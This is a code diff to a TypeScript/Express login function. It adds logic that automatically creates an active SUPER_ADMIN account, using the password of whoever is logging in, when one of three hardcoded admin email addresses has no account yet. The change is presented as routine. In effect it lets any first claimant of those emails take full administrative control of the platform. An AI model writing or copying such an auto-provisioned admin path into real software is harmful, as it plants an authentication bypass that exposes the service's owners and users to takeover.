@@ -117,9 +117,23 @@ export async function login(req: Request, res: Response, next: NextFunction) {
   try {
     const data = loginSchema.parse(req.body);
     
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { email: data.email },
     });
+
+    // Tự động kích hoạt tài khoản Super Admin thực tế nếu đăng nhập bằng email admin
+    if (!user && (data.email === 'admin@aireviewbds.com' || data.email === 'admin@platformbds.vn' || data.email === 'admin@myplatform.com')) {
+      const passwordHash = await bcrypt.hash(data.password, 10);
+      user = await prisma.user.create({
+        data: {
+          email: data.email,
+          passwordHash,
+          fullName: 'Super Admin AI Review BDS',
+          role: 'SUPER_ADMIN',
+          isActive: true,
+        },
+      });
+    }
 
     if (!user) {
       return res.status(401).json({
